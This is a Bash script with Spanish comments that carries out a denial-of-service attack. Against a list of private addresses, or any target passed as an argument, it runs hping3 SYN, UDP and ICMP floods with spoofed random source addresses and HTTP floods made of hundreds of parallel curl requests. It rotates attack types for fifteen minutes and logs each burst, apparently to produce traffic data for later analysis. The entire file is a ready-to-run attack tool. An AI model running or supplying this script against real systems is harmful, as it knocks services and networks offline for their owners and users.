#!/bin/bash
# Ataque DDoS con registro detallado para análisis externo

TARGETS=("10.1.1.5" "10.1.1.7" "10.1.1.9" "10.1.1.11" "10.1.1.13")
DURATION=900  # 15 minutos
INTERVAL=5
LOG_FILE="/tmp/ddos_attack.log"

# Configuración de tipos de ataque
ATTACK_TYPES=("SYN" "UDP" "ICMP" "HTTP") 
CURRENT_ATTACK=${2:-"SYN"}

# Función para registrar eventos
log_event() {
    echo "$(date +'%Y-%m-%d %H:%M:%S')|$1|$2|$3" >> $LOG_FILE
}

# Inicializar archivo de log
echo "timestamp|event_type|attack_type|target" > $LOG_FILE

function change_attack_pattern {
    CURRENT_ATTACK=${ATTACK_TYPES[$RANDOM % ${#ATTACK_TYPES[@]}]}
    log_event "PATTERN_CHANGE" "$CURRENT_ATTACK" "ALL"
    echo "[$(date +'%T')] Cambiando a patrón de ataque: $CURRENT_ATTACK"
}

function launch_syn_flood {
    target=$1
    log_event "ATTACK_START" "SYN" "$target"
    hping3 --rand-source -S -q -p 80 --flood -d 64 --faster $target &
    PID=$!
    sleep $((INTERVAL + RANDOM % 10))
    kill -9 $PID 2>/dev/null
    log_event "ATTACK_END" "SYN" "$target"
}

function launch_udp_flood {
    target=$1
    log_event "ATTACK_START" "UDP" "$target"
    hping3 -2 --rand-source -q -p 53 --flood -d 1024 --faster $target &
    PID=$!
    sleep $((INTERVAL - 5 + RANDOM % 8))
    kill -9 $PID 2>/dev/null
    log_event "ATTACK_END" "UDP" "$target"
}

function launch_icmp_flood {
    target=$1
    log_event "ATTACK_START" "ICMP" "$target"
    hping3 -1 --rand-source -q --flood -d 64 --faster $target &
    PID=$!
    sleep $((INTERVAL + RANDOM % 5))
    kill -9 $PID 2>/dev/null
    log_event "ATTACK_END" "ICMP" "$target"
}

function launch_http_flood {
    target=$1
    log_event "ATTACK_START" "HTTP" "$target"
    for i in {1..500}; do
        curl --connect-timeout 1 -s "http://$target" >/dev/null &
        sleep 0.01
    done
    sleep $INTERVAL
    log_event "ATTACK_END" "HTTP" "$target"
}


function attack_cycle {
    target=$1
    case $CURRENT_ATTACK in
        "SYN")
            launch_syn_flood $target
            ;;
        "UDP")
            launch_udp_flood $target
            ;;
        "ICMP")
            launch_icmp_flood $target
            ;;
        "HTTP")
            launch_http_flood $target
            ;;
    esac
}

# Verificar si se especificó un target
if [ $# -ge 1 ]; then
    TARGETS=($1)
fi

echo "=============================================="
echo " INICIANDO ATAQUE DDoS AVANZADO"
echo " Tipo: $CURRENT_ATTACK"
echo " Targets: ${TARGETS[@]}"
echo " Duración: $DURATION segundos"
echo " Intervalo de cambio: $INTERVAL segundos"
echo "=============================================="

# Iniciar temporizador
start_time=$(date +%s)
end_time=$((start_time + DURATION))

# Bucle principal de ataque
while [ $(date +%s) -lt $end_time ]; do
    # Seleccionar target aleatorio
    target=${TARGETS[$RANDOM % ${#TARGETS[@]}]}
    
    # Cambiar patrón periódicamente (solo si no se especificó tipo)
    if [ $# -lt 2 ] && [ $((RANDOM % 4)) -eq 0 ]; then
        change_attack_pattern
    fi
    
    # Ejecutar ciclo de ataque
    echo "[$(date +'%T')] Atacando $target con $CURRENT_ATTACK"
    attack_cycle $target
    
    # Pequeña pausa entre ciclos
    sleep 1
done

echo "=============================================="
echo " ATAQUE FINALIZADO"
echo "=============================================="

# Limpiar procesos residuales
pkill -9 hping3 2>/dev/null
pkill -9 curl 2>/dev/null